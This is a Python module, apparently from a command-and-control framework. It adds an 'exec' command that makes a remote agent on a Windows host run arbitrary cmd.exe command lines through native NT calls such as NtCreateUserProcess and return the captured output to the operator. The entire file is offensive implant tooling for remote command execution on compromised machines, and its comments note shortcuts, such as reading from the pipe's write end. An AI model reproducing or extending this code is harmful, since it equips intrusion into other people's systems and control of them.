NAME = "exec"
DESCRIPTION = "Execute a command natively and capture its output using NtCreateUserProcess"
PARAMS = [
    {"name":"command_line", "description":"Command to run (e.g. cmd.exe /c whoami)", "type":"str"}
]
DEPENDENCIES = [
    "NtAllocateVirtualMemory", 
    "NtCreateFile",            # Used for creating the output pipe
    "RtlCreateProcessParametersEx", 
    "NtCreateUserProcess", 
    "NtReadFile", 
    "NtClose", 
    "NtFreeVirtualMemory",
    "RtlInitUnicodeString"
]

def function(agent_id, args, dependencies):
    from services.orders import read_from_agent
    
    # Resolve all dependencies
    NtAlloc   = dependencies[0]
    NtCreateF = dependencies[1]
    RtlParams = dependencies[2]
    NtCreateP = dependencies[3]
    NtRead    = dependencies[4]
    NtClose   = dependencies[5]
    NtFree    = dependencies[6]
    initUnicodeString = dependencies[7]

    command_raw = args[0]
    # Paths for NtCreateUserProcess usually require the full NT path for the image
    image_path = "\\??\\C:\\Windows\\System32\\cmd.exe"
    command_line = f"cmd.exe /c {command_raw}"
    
    # 1. ALLOCATE ENVIRONMENT/PARAMS MEMORY
    # We need a block to store our strings and the resulting ProcessParameters struct
    alloc_ret = NtAlloc(agent_id, [16384, 0x04]) # 16KB PAGE_READWRITE
    if alloc_ret["NTSTATUS"] != 0:
        return {"Result": "Failed to allocate process memory"}
    process_mem_ptr = alloc_ret["allocated_memory"]

    # 2. CREATE PIPE FOR OUTPUT (NtCreateFile target: \Device\NamedPipe\)
    # We create one pipe. The agent returns the handle.
    # DesiredAccess: 0xC0100000 (Generic Read/Write / Synchronize)
    pipe_path = "\\Device\\NamedPipe\\" 
    pipe_ret = NtCreateF(agent_id, [pipe_path, 0xC0100000]) # Simplified NtCreateFile for pipes
    if pipe_ret["NTSTATUS"] != 0:
        NtFree(agent_id, [process_mem_ptr, 16384])
        return {"Result": "Failed to create output pipe"}
    hPipeWrite = pipe_ret["FILE_HANDLE"]

    # 3. INITIALIZE PROCESS PARAMETERS
    # We pass our command line and the pipe handle for redirection
    # This function should internally set params->StandardOutput = hPipeWrite
    param_ret = RtlParams(agent_id, [image_path, command_line, hPipeWrite], [NtAlloc, NtFree,initUnicodeString])
    if param_ret["NTSTATUS"] != 0:
        NtClose(agent_id, [hPipeWrite])
        NtFree(agent_id, [process_mem_ptr, 16384])
        return {"Result": "Failed to initialize process parameters"}
    pProcessParams = param_ret["pProcessParams"]
    ntstatus = param_ret["NTSTATUS"]
    print(f"RtlCreateProcessParametersEx = NTSTATUS = {hex(ntstatus)}, ptr = {hex(pProcessParams)}")
    # 4. EXECUTE PROCESS (NtCreateUserProcess)
    # This uses Syscall 0xAF with our pProcessParams
    proc_ret = NtCreateP(agent_id, [pProcessParams, image_path, pipe_ret["FILE_HANDLE"]])
    if proc_ret["NTSTATUS"] != 0:
        NtClose(agent_id, [hPipeWrite])
        NtFree(agent_id, [process_mem_ptr, 16384])
        return {"Result": f"Execution failed: {hex(proc_ret['NTSTATUS'])}"}
    
    hProcess = proc_ret["PROCESS_HANDLE"]
    hThread  = proc_ret["THREAD_HANDLE"]

    # 5. READ OUTPUT (NtReadFile)
    # We allocate a buffer for the output data
    output_buf_size = 8192
    output_alloc = NtAlloc(agent_id, [output_buf_size, 0x04])
    output_ptr = output_alloc["allocated_memory"]
    
    # Note: hPipeWrite is the write end. In a real scenario, you'd have hPipeRead.
    # We assume NtReadFile uses the correct handle retrieved from NtCreateFile call.
    read_ret = NtRead(agent_id, [hPipeWrite, 0, output_ptr, output_buf_size])
    
    captured_output = ""
    if read_ret["NTSTATUS"] == 0 or read_ret["NTSTATUS"] == 0xC0000011: # SUCCESS or EOF
        raw_data = read_from_agent(agent_id, output_ptr, output_buf_size)
        captured_output = raw_data.decode('utf-8', errors='ignore').strip('\x00')

    # 6. CLEANUP
    NtClose(agent_id, [hProcess])
    NtClose(agent_id, [hThread])
    NtClose(agent_id, [hPipeWrite])
    NtFree(agent_id, [process_mem_ptr, 16384])
    NtFree(agent_id, [output_ptr, output_buf_size])

    return {
        "Result": "Success",
        "Command": command_line,
        "Output": captured_output
    }